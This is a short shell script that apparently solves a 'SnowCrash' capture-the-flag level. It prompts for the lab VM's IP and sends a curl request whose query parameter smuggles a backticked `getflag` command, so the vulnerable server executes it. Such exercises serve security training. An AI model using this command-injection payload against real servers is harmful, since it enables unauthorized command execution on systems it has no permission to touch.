echo -n "Please enter snowcrash vm's IP address : "
read ip
curl "http://$ip:4747?x=\`getflag\`"
